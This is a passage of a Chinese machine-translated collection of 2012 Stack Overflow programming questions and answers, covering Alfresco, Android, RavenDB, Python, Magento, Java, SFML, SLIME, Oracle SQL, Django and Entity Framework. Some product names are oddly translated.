      // Alternatively, read state from document.location.href if it's there
      var cookies = document.cookie.split("; ");
      $.map($.makeArray(cookies), function (cookie_str) {
        var cookie = cookie_str.split("=");
        if (cookie[0] == "quick-brew-header") {
          state = cookie[1];
        }
      });
    }

    if (state === "true" || state === "false") {
      state = (state === "true");
    }
    return state;
  }

  function header_off() {
    store_toggle_state(false);
    $(".zone-preface-wrapper").animate({height:40},40);
  }

  function header_on() {
    store_toggle_state(true);
    $(".zone-preface-wrapper").animate({height:165}, 40);
  }

  var show_at_load = get_toggle_state();
  if (show_at_load) {
    header_on();
  } else {
    header_off();
  }
  // What happens on even/odd clicks depends on if we showed the header at page load
  $(".quick-brew-header").toggle(show_at_load ? header_off : header_on,
                                 show_at_load ? header_on : header_off);     
}); 
```

# ftp - 通过更改其类型在露天复制/移动文档

> ID：13822477
> 
> 赞同：0
> 
> 时间：2012-12-11T15:01:48.030
> 
> 标签：ftp, alfresco, cmis, alfresco-share

我正在尝试在露天上传一个大文件，因为这会导致 java.lang.OutOfMemoryError: Java heap space 出现问题

我决定使用 ftp 在露天上传文件。另一个问题随之而来；我无法创建所需类型的文档。

所以我在想，在我在露天上传文档后，然后通过更改其类型将文档复制/移动到另一个文件夹（再次在露天）。我不确定这是否可能。我试着环顾四周，没有什么好的线索。

有人可以告诉我是否可能吗？如果是这样怎么办？

谢谢，

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-12T10:27:44.117

在专门用于该类型的文件夹上添加传入规则。

如果您使用共享，请在您的`share-config-custom.xml` 条件 DocumentLibrary 中添加内容类型。[在这里](https://stackoverflow.com/questions/6792131/alfresco-share-not-showing-subtype-or-custom-type)您可以找到如何指定它。

# java - 将 Toast 与 BufferedReader 一起使用

> ID：13822478
> 
> 赞同：0
> 
> 时间：2012-12-11T15:01:52.987
> 
> 标签：java, android, tcp, alert, toast

我希望你能帮忙。

基本上，我想将“BufferedReader”读取的内容发送到 Toast，但我以前从未使用过 Toast，似乎无法理解它。

正如您在下面看到的，BufferedReader 是“In”。

提前致谢。

代码：

```
package com.smarte.smartipcontrol;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.net.InetAddress;
import java.net.Socket;
import java.net.UnknownHostException;

import android.app.Activity;
import android.content.Intent;
import android.os.AsyncTask;
import android.os.Bundle;
import android.view.View;

public class IPControl extends Activity {

private Socket socket;
private static final int REDIRECTED_SERVERPORT = 32;
public PrintWriter out;
public BufferedReader in;
public String data;
public Object pd;
Intent intent;
String actu_ip; 
String textStatus;

public void getModel(View view) {
    try {
        out.println("[m\r\n");
        //System.out.print("root\r\n");
        while(!in.ready());
        textStatus = readBuffer();

    } catch(IOException e) {
        e.printStackTrace();
    }
}

//get the message from intent   
@Override
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    Intent intent = getIntent();
    actu_ip = intent.getStringExtra(IPEntry.ACTUALSMARTIP);
    setContentView(R.layout.act_ipcontrol);

    try {
        new AsyncAction().execute();
    } catch(Exception e) {
        e.printStackTrace();
    }
}

private class AsyncAction extends AsyncTask<String, Void, String> {
    protected String doInBackground(String... args) { 
        try {
            InetAddress serverAddr = InetAddress.getByName(actu_ip);
            socket = new Socket(serverAddr, REDIRECTED_SERVERPORT);
            OutputStreamWriter osw = new OutputStreamWriter(socket.getOutputStream());
            BufferedWriter bw = new BufferedWriter(osw);
            out = new PrintWriter(bw, true); 
            in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            while (! in .ready());
            readBuffer();
            out.println("root\r\n");
            while (! in .ready());
            readBuffer();
            out.println("root\r\n");
            while (! in .ready());
            String msg = "";
            while ( in .ready()) {
                msg = msg + (char) in .read();
            }
        } catch (UnknownHostException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }

        return null;//returns what you want to pass to the onPostExecute()
    }

    protected void onPostExecute(String result) {

        //results the data returned from doInbackground

        IPControl.this.data = result;

    }
}

private String readBuffer() throws IOException {
    String msg = "";

    while(in.ready()) {
        msg = msg + (char)in.read();
    }
    //System.out.print(msg);
    if(msg.indexOf("SNX_COM> ") != -1) return msg.substring(0, msg.indexOf("SNX_COM> "));
    else if(msg.indexOf("SCX_COM> ") != -1) return msg.substring(0, msg.indexOf("SCX_COM> "));
    else return msg;
}
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-11T15:11:19.037

Toast 只是在屏幕上显示一条消息

`Toast.makeText(context, message to display, Toast.LENGTH_SHORT).show();`

在你的 IPControl 活动中，把它放在你的某个地方`onCreate`，你会看到 Toast 做了什么

`Toast.makeText(IPControl.this, "Thanks for stopping by!", Toast.LENGTH_LONG).show();`

在`onPostExecute()`尝试

`Toast.makeText(IPControl.this, result, Toast.LENGTH_LONG).show();`

# c# - 在 ravendb 中是否可以删除级联

> ID：13822479
> 
> 赞同：3
> 
> 时间：2012-12-11T15:01:53.970
> 
> 标签：c#, ravendb

仍然只是 ravendb 的初学者。我怀疑 raven db 是否支持某种参照完整性。

这是我的怀疑和工作..

我有如下文件类型屏幕

```
public class Screens 
    {
        public String Id { get; set; }
        public String ScreenName { get; set; }
} 
```

另一个名为 RightsDeclaration 的文件如下

```
public class RightsDeclaration 
    {
        public RightsDeclaration()
        {
            _screenrights = new List<ScreenRight>();
        }

        public String Id { get; set; }// Role Name 
        List<ScreenRight> _screenrights;
        public List<ScreenRight> ScreenRights { get { return _screenrights; } set { _screenrights = value; } }
} 
```

现在屏幕权限类如下所示，屏幕名称字段如下

```
public class ScreenRight :
    {

        public String ScreenName { get; set; }
        public Boolean Create { get; set; }
        public Boolean Read { get; set; }
        public Boolean Update { get; set; }
        public Boolean Delete { get; set; }
        public Boolean Approve { get; set; }
        public Boolean Access { get; set; }
        public Boolean Print { get; set; }
        public Boolean Email { get; set; }
} 
```

现在首先我将创建一些屏幕列表，然后我为每个角色分配权限，并提及屏幕名称和权限列表。到目前为止，一切都很好。现在在一个场景中，如果我要删除屏幕类中的屏幕名称，但该屏幕的屏幕权限仍然存在于权限声明中。是否也可以从用户权限文档中删除相应的屏幕权限？如果是这样，请提及执行上述操作的查询或想法..提前致谢..

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-11T16:11:47.580

Raven 不支持真正的参照完整性，这不是文档数据库通常感兴趣的东西。但是，您可以实现相同的效果。

首先，我不会通过名称引用，屏幕 ID 是一个更好的键，因为您可以通过它加载。如果您还想在`ScreenRight`班级中捕获屏幕名称，那很好，但这是次要问题。

此外，这是一件小事，但请尽量保持您的实体/文档名称单一。 `Screen`而不是`Screens`. 它将为您节省一些麻烦。

处理删除的一种方法是在删除主文件时专门更新引用文档。如果您在同一个会话中执行此操作，则您有事务保证。您确实必须考虑对查询结果进行分页。

```
using (var session = documentStore.OpenSession())
{
    var screen = session.Load<Screen>(screenId);
    if (screen != null)
    {
        // Set up some variables to help with pagination.
        var now = DateTime.UtcNow;
        const int pageSize = 1024;
        var page = 0;

        while (true)
        {
            // Get all rights that use this screen.
            // Waiting for nonstale results is appropriate, but we want the same "now" with each page.
            var rights = session.Query<RightsDeclaration>()
                                .Customize(x => x.WaitForNonStaleResultsAsOf(now))
                                .Where(x => x.ScreenRights.Any(y => y.ScreenId == screenId))
                                .Skip(page * pageSize)
                                .Take(pageSize)
                                .ToList();

            foreach (var right in rights)
            {
                // Remove the screen from any rights that used it
                right.ScreenRights.RemoveAll(x => x.ScreenId == screenId);

                // You might want to delete any empty rights declarations
                if (right.ScreenRights.Count == 0)
                    session.Delete(right);
            }

            // Exit when we get back less than a full page, indicating there are no more pages.
            if (rights.Count < pageSize)
                break;

            // Next page please.
            page++;
        }

        // Delete the screen.
        session.Delete(screen);

        // Save all your changes together.
        session.SaveChanges();
    }
} 
```

另一种方法是使用 Raven 的[Patching API](http://ravendb.net/docs/client-api/partial-document-updates)来执行更新。它更快，但您没有交易保证。

您还可以查看 Raven 的[Cascading Deletes Bundle](http://ravendb.net/docs/server/bundles/cascade-delete)，但我认为它不会在这里起作用，因为您不一定`RightsDeclaration`每次都删除。

**更新**

我将一些更难的分页代码推出了一个易于使用的扩展方法。这现在是[ravendb/contrib](https://github.com/ravendb/contrib)项目的一部分。使用这些扩展，您的代码会简单得多：

```
using (var session = documentStore.OpenSession())
{
    var screen = session.Load<Screen>(screenId);
    if (screen != null)
    {
        // Get all rights that use this screen.
        session.Query<RightsDeclaration>()
                .Customize(x => x.WaitForNonStaleResultsAsOfNow())
                .Where(x => x.ScreenRights.Any(y => y.ScreenId == screenId))
                .ForEachWithPaging(right =>
                    {
                        // Remove the screen from any rights that used it
                        right.ScreenRights.RemoveAll(x => x.ScreenId == screenId);

                        // You might want to delete any empty rights declarations
                        if (right.ScreenRights.Count == 0)
                            session.Delete(right);
                    });

        // Delete the screen.
        session.Delete(screen);

        // Save all your changes together.
        session.SaveChanges();
    }
} 
```

# python - 从 Ubuntu 上的另一个脚本启动 python 脚本进程：如何跟踪状态？

> ID：13822480
> 
> 赞同：0
> 
> 时间：2012-12-11T15:01:53.880
> 
> 标签：python, system, termination

我使用以下命令在 Amazon EC2 Ubuntu 实例上从另一个 Python 脚本中启动一个 Python 脚本：

```
os.system(call) 
```

`call`表格在哪里

```
"./script2.py arg1 arg2 arg3" 
```

我注意到有时会以`script2.py`某种方式过早终止。我有一些日志记录语句，但它们没有显示发生了什么。所以我的问题是：

1.  我读到`system()`返回某种退出状态。区分正常终止和异常终止的最佳测试是什么？也就是说，如果有某种异常终止，我只想在调用脚本中生成一条日志消息。
2.  是否有任何类型的系统日志可以让我尝试找到终止进程的痕迹？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-11T15:46:23.843

假设您的子脚本不使用标准输出并在崩溃时返回非零（但这应该是`python`可执行文件的默认值）：

```
import subprocess as sp

try:
    sp.check_output(['python', 'child.py'], stderr=sp.STDOUT)
except sp.CalledProcessError as err:
    print 'Child terminated abnormally with error %d, log:' % err.returncode
    print err.output 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-11T15:10:53.717

1> os.system 如果返回 0 进程运行并成功终止，则返回系统代码，但如果它返回任何数字，则通常表示错误，但它取决于 progam 如何响应错误我的意思是如果 progam 在成功时返回 1 os.system 将返回 1

例如

```
d = os.system('ls')
print d 
d = os.system(your process)
print d 
```

2> python提供了syslog模块，你可以试试

```
>>>import syslog
>>>help(syslog) 
```

syslog 是 os 本身提供的内置 unix api

[http://docs.python.org/2/library/syslog.html](http://docs.python.org/2/library/syslog.html)

# php - 如何在 magento 1.7.0.2 的时事通讯中添加新字段（订阅者名称）？

> ID：13822481
> 
> 赞同：1
> 
> 时间：2012-12-11T15:01:57.013
> 
> 标签：php, magento, e-commerce, magento-1.7

我正在尝试在时事通讯订阅表单中添加一个新字段。[我找到了这个解决方案](https://stackoverflow.com/questions/3155784/adding-a-custom-field-to-magentos-subscribtion-module)。但是当我打开答案中提到的文件时，即 Mage_Newsletter_Model_Mysql4_Subscriber (app/code/core/Mage/Newsletter/Model/Mysql4/Subscriber.php)

我看起来像：

```
class Mage_Newsletter_Model_Mysql4_Subscriber extends Mage_Newsletter_Model_Resource_Subscriber
{
} 
```

修改文件让我很困惑。任何人都可以指导如何实现我想要的吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-11T22:01:34.320

关键是类声明：

```
class Mage_Newsletter_Model_Mysql4_Subscriber extends Mage_Newsletter_Model_Resource_Subscriber 
```

注意这个词`extends`？这意味着该类从 Mage_Newsletter_Model_Resource_Subscriber 类继承其功能。我会查看 app/code/core/Mage/Newsletter/Model/Resource/Subscriber.php 文件。

这与您找到的解决方案不同的原因是，从 1.6 社区版开始，不推荐使用 Mysql4 模型并使用了 Resource。这是为了让 Magento 更好地支持不同的数据库引擎。

# java - java基本工资方案

> ID：13822483
> 
> 赞同：2
> 
> 时间：2012-12-11T15:02:01.010
> 
> 标签：java

我是 java 新手，我不断收到此错误消息：

> 无法访问 Managesalary 类型的封闭实例。必须使用 Managesalary 类型的封闭实例来限定分配（例如 xnew A()，其中 x 是 Managesalary 的实例）。在线的 *

```
public class Managesalary
{
    public static void main(String[] args)

    {
        System.out.println("MY SALARY REVIEW");
        System.out.println("================");

    *   Salary Jan= new Salary();
        Jan.Month= "JANUARY";
        Jan.HoursWorked= 12;
        Jan.PerHourRate= 10;
        Jan.TaxRate= 0.10;

        Jan.printSalaryDetails();

        Salary Month2= new Salary();
        Month2.Month= "FEBUARY";
        Month2.PerHourRate= 10;
        Month2.TaxRate= 0.10;
        Month2.printSalaryDetails();

    }

class Salary
    {
    String Month = "";
    int HoursWorked= 0;
    int PerHourRate= 0;
    double TaxRate= 0.10;
    int MonthlySalary= (HoursWorked*PerHourRate);

    public void printSalaryDetails(){
        System.out.println("MONTH OF = " +Month);
        System.out.println("PER HOUR RATE = " +PerHourRate);
        System.out.println("TAX RATE =   " +TaxRate);
        System.out.println("TOTAL MONTHLY INCOME = " +MonthlySalary);
        System.out.println("================");
    } 
    } 
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-11T15:06:23.690

错误说您必须通过引用封闭类的实例来创建内部类。

```
ManageSalary mn = new Managesalary()
Salary salary =  mn.new Salary(); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-11T15:12:07.300

将您的 Salary 类复制到单独的文件名 Salary.java 中并将其公开，最好将其放在主类之外，或者将其声明为静态。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-11T15:05:53.677

内部类需要对外部类的现有引用。没有它的实例`Managesalary`就不可能实例化`Salary`。您可以通过执行以下操作来实现：

```
Managesalary mSalary = new Managesalary();
Salary Jan= mSalary.new Salary(); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-11T15:07:21.167

您已将`Salary`该类定义为的内部类`Managesalary`（尽管您的代码缩进隐藏了一点）。

因此， 的每个实例都`Salary`必须绑定到 的实例`Managesalary`。

在您的`main`方法中，创建`Managesalary`(eg `ManageSalary ms = new ManageSalary()`) 的实例并将您的内部类对象初始化为`ms.new Salary()`.

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2018-03-27T23:59:34.210

将您的薪水类设为静态

```
static class Salary{
    // rest of the code
} 
```

# c++ - C++ SFML 2.0 从文件加载图像

> ID：13822499
> 
> 赞同：0
> 
> 时间：2012-12-11T15:03:06.003
> 
> 标签：c++, image, sfml

我是 SFML 的新手，我正在使用 SFML 2.0 我刚刚编写了一些代码并且它工作正常但问题是当我加载图像以在屏幕上显示时它给了我错误

```
Failed to load image "Splashscreen.png". Reason : Unable to open file
Failed to load image "Mainmenu.png". Reason : Unable to open file 
```

我从 Url 加载图像的代码是

对于菜单图像

```
sf::Texture menuTexture;

menuTexture.loadFromFile("Mainmenu.png");
    {
        sf::Sprite sprite(menuTexture);

        MenuItem playButton;
        playButton.rect.top = 145;
        playButton.rect.height = playButton.rect.top + 380;
        playButton.rect.left = 0;
        playButton.rect.width = playButton.rect.left + 1023; 
        playButton.menuAction = Play;

        MenuItem exitButton;
        exitButton.rect.top = 0;
        exitButton.rect.height = exitButton.rect.top + 1023;
        exitButton.rect.left = 383;
        exitButton.rect.width = exitButton.rect.left + 560; 
        exitButton.menuAction = Exit;

        menuItem.push_back(playButton);
        menuItem.push_back(exitButton);

        window.draw(sprite);
        window.display();

        return GetMenuResponse(window);
    } 
```

对于启动画面图像

```
sf::Texture texture;
    if(texture.loadFromFile("Splashscreen.png") != true)
    {
        return;
    }

    sf::Sprite sprite(texture);
    renderWindow.clear();
    renderWindow.draw(sprite,sf::RenderStates::Default);
    renderWindow.display();
    sf::Event event;
        while(true)
        {
            while(renderWindow.pollEvent(event))
            {
                if(event.type == sf::Event::EventType::KeyPressed 
                    || event.type == sf::Event::EventType::MouseButtonPressed
                    || event.type == sf::Event::EventType::Closed)
                {
                    return;
                }
            }
        } 
```

图像未加载任何人都可以帮助解决此问题。

但是当我构建我的项目并从调试文件夹运行相同的程序时，我的意思是当我运行 exe 文件时，图像会显示，但是当我从 Visual Studio 2010 运行程序时，图像没有加载并且当我在发布模式下运行程序时程序崩溃。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-11T15:06:53.930

您是否检查过该文件是否在您的工作目录中？它可以与输出目录不同！

# macos - 在 MacOSX 上设置 SLIME

> ID：13822504
> 
> 赞同：11
> 
> 时间：2012-12-11T15:03:22.773
> 
> 标签：macos, emacs, installation, slime, sbcl

几十年来我一直在围绕 LISP 跳舞，但现在决定认真起来。我正在浏览 Practical Common LISP 的在线版本。

这是我的设置：

MacOSX 10.7.8
Xcode 4.5.2
SBCL 1.0.55.0-abb03f9
Emacs 24.2.1 (x86_64-apple-darwin, NS apple-appkit-1038.36)
SLIME 1.6

我尝试按照链接中列出的说明进行操作：

[http://emacs-sbcl-slime.blogspot.com/2010/11/sbcl-emacs-slime-macosx.html](http://emacs-sbcl-slime.blogspot.com/2010/11/sbcl-emacs-slime-macosx.html)

…但问题是在 MacOSX 平台上，似乎没有任何东西位于它应该位于的位置。

SBCL 是使用自己的脚本安装的……它正在工作。

我按照说明设置了 SBCL_HOME 环境变量。

Emacs 是由 dmg 从这个链接安装的：

[http://emacs-sbcl-slime.blogspot.com/2010/11/sbcl-emacs-slime-macosx.html](http://emacs-sbcl-slime.blogspot.com/2010/11/sbcl-emacs-slime-macosx.html)

…并且正在运行。

然而，SLIME（通过 cvs 下载到 ~/.emacs.d/slime）似乎无法识别。无法得到作者描述的“CL-USER>”提示。

任何帮助将不胜感激！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-11T15:21:19.663

1.  将 slime 的整个目录复制到`emacs/site-lisp`
2.  确保您的 lisp 可以从终端访问。只需输入`sbcl`终端。Lisp 解释器应该启动。
3.  放入您的 .emacs 文件中，例如`(setq inferior-lisp-program "sbcl")`

它应该工作。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-11T21:42:59.360

我建议只使用[Emacs Prelude](https://github.com/bbatsov/prelude)，它带有一个很好的 Common Lisp + SLIME 配置作为默认配置。它是为 OSX 上的 Clozure CL 预先配置的（考虑到它可以说是 OSX 上最流行的 Common Lisp 发行版），但是在您的 Prelude 个人配置中，一行简单的 Emacs Lisp 可以将 SLIME 的默认 Lisp 切换为 SBCL：

```
(setq slime-default-lisp 'sbcl) 
```

安装 SLIME 本身的最佳方式可能是通过[Quicklisp 的 SLIME 助手](http://www.quicklisp.org/beta/)。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-10-16T02:46:41.397

您是否考虑过使用出色的 LispBox 包来为您处理所有设置？这非常简单：[http ://common-lisp.net/project/lispbox/](http://common-lisp.net/project/lispbox/)

它包括 emacs、SLIME、Clozure Common Lisp 环境、QuickLisp 和所有预配置的东西。

# java - JavaFX ChoiceBox 空选择

> ID：13822505
> 
> 赞同：0
> 
> 时间：2012-12-11T15:03:24.000
> 
> 标签：java, javafx-2, javafx

我想在 ChoiceBox 控件上接受空选择。默认情况下，选择为空......但是，有没有办法让 ChoiceBox 控件允许用户在用户选择一个项目后取消选择一个项目？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-11T15:08:13.637

添加另一个带有标签“ *Select...* ”和 value的项目`NULL`。

# ios5 - 如何通过单击 UINavigationController 中的 UIBarButtonItem 在 Storyboard 中切换视图？

> ID：13822508
> 
> 赞同：1
> 
> 时间：2012-12-11T15:03:31.490
> 
> 标签：ios5, storyboard

我想以两种模式显示一些数据，因此通过单击 UINavigationControlle 中名为“switch”的 UIBarButtonItem。

我可以使用 Storyboard 和 xib 来做到这一点，**但我只想知道如何只使用 Storyboard 来实现它。**

*使用情节提要和 xib：* ![在此处输入图像描述](../Images/81c0454ccc71a295913f93baabe6eedf.png) ![在此处输入图像描述](../Images/f898a65af5c5cf8fe26167ffb208fe1a.png) ![在此处输入图像描述](../Images/11086b8bb3961bb9e03d477d2375785d.png)

```
#import "ViewController.h"
#import "ViewControllerOne.h"
#import "ViewControllerTwo.h"

@implementation ViewController

- (void)viewDidLoad
{
    [super viewDidLoad];

    ViewControllerOne *view1 = [[ViewControllerOne alloc] init];
    ViewControllerTwo *view2 = [[ViewControllerTwo alloc] init];

    [self.view insertSubview:view1.view atIndex:1];
    [self.view insertSubview:view2.view atIndex:0];
}

- (IBAction)switchButton:(id)sender
{
    [self.view exchangeSubviewAtIndex:0 withSubviewAtIndex:1];
} 
```

*如果我只使用 Storyboard 和上面的代码，那么什么都没有发生，视图就是空的：* ![在此处输入图像描述](../Images/7a79a96eeb483bda14f5dc70804d0537.png)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-11T15:39:34.820

为什么不直接在没有代码的情节提要中使用序列。这将是简单而足够的

# android - 通知点击的Android调用方法

> ID：13822509
> 
> 赞同：20
> 
> 时间：2012-12-11T15:03:37.250
> 
> 标签：android, android-intent, android-activity, android-notifications

此代码创建一个通知。如果单击它，则会运行当前应用程序（intent 是在 中创建的`Entry`，这是我唯一`Activity`的），一个 Android 开发者博客的略微修改版本：

```
private void makeIntent() {
    NotificationManager mgr = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
    Notification note = new Notification(R.drawable.prev, "Status message!", System.currentTimeMillis());
    Intent intent = new Intent(this, Entry.class);
    PendingIntent pi = PendingIntent.getActivity(this, 0, intent, 0);
    note.setLatestEventInfo(this, "New Email", "Unread Conversation", pi);
    note.flags |= Notification.FLAG_AUTO_CANCEL;
    mgr.notify(NOTIFY_ME_ID, note);
} 
```

但我不想启动任何活动，而只想在当前活动中运行一个方法。从我目前所读的内容来看，我想我必须使用诸如`startActivityForResult()`, use`intent-filters`和 implement之类的方法`onActivityResult()`，但是在搞砸了所有这些事情之后，改变了 and 中的东西`Intent`，`PendingIntent`我仍然没有可用的结果。是否有可能以某种方式调用`Entry`（我的 main中的方法`Activity`，在其中创建），或者当我单击新创建的时`Intent`捕获任何传出或传入？`Intents``Notification`

PS。如果这是一个重复的线程，我很抱歉，所以现在很慢，我无法正确搜索。

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2013-01-26T18:01:57.697

在清单文件中添加`android:launchMode="singleTop"`您`activity`的方法`protected void onNewIntent(Intent intent) { ... }`并使用以下代码：

```
private static final int MY_NOTIFICATION_ID = 1;
private NotificationManager notificationManager;
private Notification myNotification;

void notification() {   
    notificationManager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
    myNotification = new Notification(R.drawable.next, "Notification!", System.currentTimeMillis());
    Context context = getApplicationContext();
    String notificationTitle = "Exercise of Notification!";
    String notificationText = "http://android-er.blogspot.com/";
    Intent myIntent = new Intent(this, YourActivity.class);
    PendingIntent pendingIntent = PendingIntent.getActivity(YourActivity.this, 0, myIntent, Intent.FILL_IN_ACTION);
    myNotification.flags |= Notification.FLAG_AUTO_CANCEL;
    myNotification.setLatestEventInfo(context, notificationTitle, notificationText, pendingIntent);
    notificationManager.notify(MY_NOTIFICATION_ID, myNotification);
} 
```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2016-03-03T09:46:14.430

这对我来说 100% 有效：

将此代码放在一个方法中：

```
Intent intent = new Intent(this, YourClass.class);
    intent.putExtra("NotiClick",true);
    PendingIntent pIntent = PendingIntent.getActivity(this, 0, intent, PendingIntent.FLAG_UPDATE_CURRENT);

 if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.JELLY_BEAN) {
        Notification Noti;
        Noti = new Notification.Builder(this)
                .setContentTitle("YourTitle")
                .setContentText("YourDescription")
                .setSmallIcon(R.mipmap.ic_launcher)
                .setContentIntent(pIntent)
                .setAutoCancel(true).build();

        NotificationManager notificationManager =
                (NotificationManager) getSystemService(NOTIFICATION_SERVICE);

        notificationManager.notify(0, Noti);
    } 
```

然后在你的类的 onCreate/constructor 中执行以下操作：

```
if (savedInstanceState == null) {
        Bundle extras = getIntent().getExtras();
        if(extras == null) 
        {
            //Cry about not being clicked on
        } 
        else if (extras.getBoolean("NotiClick"))
        {
            //Do your stuff here mate :)
        }

    } 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-04-29T08:27:28.963

```
 Intent intent = new Intent(this, Notificationintent.class);
    PendingIntent pIntent = PendingIntent.getActivity(this, 0, intent, 0);

    Notification noti = new Notification.Builder(this)
    .setContentTitle("APP NOTIFICATION")
    .setContentText(messageValue)
    .setSmallIcon(R.drawable.ic_launcher)
     .setStyle(new Notification.BigTextStyle()
     .bigText(messageValue))
    .setContentIntent(pIntent).build();

NotificationManager notificationManager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
// hide the notification after its selected
noti.flags |= Notification.FLAG_AUTO_CANCEL;

notificationManager.notify(0, noti); 
```

# sql - 如何在一个查询中计算（*）多个表、大小和表空间

> ID：13822512
> 
> 赞同：2
> 
> 时间：2012-12-11T15:02:46.853
> 
> 标签：sql, oracle

我有 2 个输出正确的工作查询。第一个查询给出表名列表和计数，第二个查询给出表名列表、MB 大小和表空间名称。

如何将它们组合到一个查询中？

查询一：

```
select table_name
,to_number(extractvalue(xmltype(
dbms_xmlgen.getxml(
'select count(*) c from '||table_name))
,'/ROWSET/ROW/C')) count
from user_tables 
where table_name like 'AUD_2012080%'
order by table_name desc; 
```

查询 2：

```
select segment_name,blocks*8192/1024/1024 as MB,tablespace_name 
from dba_segments 
where segment_name like 'AUD_2012080%' 
order by segment_name desc; 
```

输出1：

```
TABLE_NAME                          COUNT
------------------------------ ----------
AUD_20120809                        27967 
AUD_20120808                        28269 
AUD_20120807                        29354 
AUD_20120806                        27155 
AUD_20120805                        18042 
AUD_20120804                        19033 
AUD_20120803                        24642 
AUD_20120802                        26760 
AUD_20120801                        25776 
```

输出 2：

```
SEGMENT_NAME                 MB TABLESPACE_NAME              
-------------------- ---------- ------------------------------
AUD_20120809                 35 WSS_BIG_I                      
AUD_20120808                 35 WSS_BIG_I                      
AUD_20120807                 36 WSS_BIG_I                      
AUD_20120806                 34 WSS_BIG_I                      
AUD_20120805                 24 WSS_BIG_I                      
AUD_20120804                 24 WSS_BIG_I                      
AUD_20120803                 29 WSS_BIG_I                      
AUD_20120802                 32 WSS_BIG_I                      
AUD_20120801                 30 WSS_BIG_I 
```

我正在寻找的结果是：

```
Table_name    count   owner    MB   Tablespace_name
AUD_20120801  25776   auditor  30   wss_big_i 
...
... 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-11T15:09:49.000

由于段通常像表格一样命名：

```
SELECT ut.table_name,
       to_number(extractvalue(xmltype (dbms_xmlgen.getxml ('select count(*) c from ' ||ut.table_name)),'/ROWSET/ROW/C')) row_count,
       db.blocks*8192/1024/1024 as MB,
       db.tablespace_name 
FROM user_tables ut
  join dba_segments db on db.segment_name = ut.table_name
WHERE ut.table_name LIKE 'AUD_2012080%'
ORDER BY ut.table_name DESC 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2015-08-13T12:07:08.763

一个解决方案是：

```
SELECT ut.table_name
, NVL(extractvalue(xmltype (dbms_xmlgen.getxml ('select max(ID) x from ' || ut.table_name)),'/ROWSET/ROW/X'),0) maxID 
FROM all_tables ut
LEFT JOIN cols c ON c.TABLE_NAME = ut.TABLE_NAME
where ut.owner = 'OWNER'
AND c.COLUMN_NAME = 'ID'; 
```

# django - 在任何 django 管理命令之前运行代码

> ID：13822514
> 
> 赞同：5
> 
> 时间：2012-12-11T15:03:53.430
> 
> 标签：django

使用中间件，我可以在每个 HTTP 请求的开头和结尾执行代码。

对于 Celery 任务，我可以使用`task_prerun`and`task_postrun`信号来完成相同的任务。

django 管理命令呢？是否可以在每个 django 管理命令的开头（也可能是结尾）运行代码？这样的代码还必须知道哪个 django 管理命令即将运行（或已经运行完毕）。有一张关于[应用程序启动信号](https://code.djangoproject.com/ticket/13024)的票，它可能会或可能不会做我想要的，但无论如何它还没有准备好。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-11T16:05:15.253

正如您正确指出的那样，Django 中没有特定位置可以放置每次启动时执行的代码...

有些地方你可能会为此“滥用”，例如。in`urls.py`或 in 中的代码`models.py`应该在启动时运行...（例如，管理员将这种情况用于其`admin.autodiscover()`in `urls.py`）。

还有一些可能性可以查明代码是否由于执行了管理命令而运行；如果命令行参数[`sys.argv`](http://docs.python.org/2/library/sys.html#sys.argv)包含任何管理命令，您可以清楚地检查它们。另一种可能性是通过服务器/管理命令指定不同的设置来运行应用程序....

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-11-18T07:40:56.947

如果您需要在管理命令之前/之后添加的代码不需要访问 django 模型/设置，那么您可以简单地更新`manage.py`脚本。

```
os.environ.setdefault("DJANGO_SETTINGS_MODULE", "app.settings")

from django.core.management import execute_from_command_line
from startup import pre_management_command, post_management_command

pre_management_command(sys.argv[1], sys.argv[2:])
execute_from_command_line(sys.argv)
post_management_command(sys.argv[1], sys.argv[2:]) 
```

我不是 100% 确定，但我想`post_management_command`可以访问 django 模型。

这只是基本示例，实际上，您需要确保`sys.argv`至少有两个条目，并且第二个条目不`-`以防止误报调用为开头

```
 ./manage.py
 ./manage.py -h
 ./manage.py --help 
```

# .net - EF Code First 不创建表

> ID：13822515
> 
> 赞同：2
> 
> 时间：2012-12-11T15:03:52.537
> 
> 标签：.net, entity-framework, ef-code-first, dbset

我正在为 .NET 4 使用实体框架 5 (4.4.0)

我有一个用代码创建的模型，就像我和其他几个一样。当我运行我的应用程序时，它会创建数据库，但不会创建任何表。之后，应用程序退出且没有错误消息 - 即使在调试模式下也是如此。我不知道问题是什么。

其他人有这个问题吗？

创建上下文类时顺序重要吗？

```
public DbSet<Order> Orders ...
public DbSet<OrderDetail> OrderDetails ... 
```

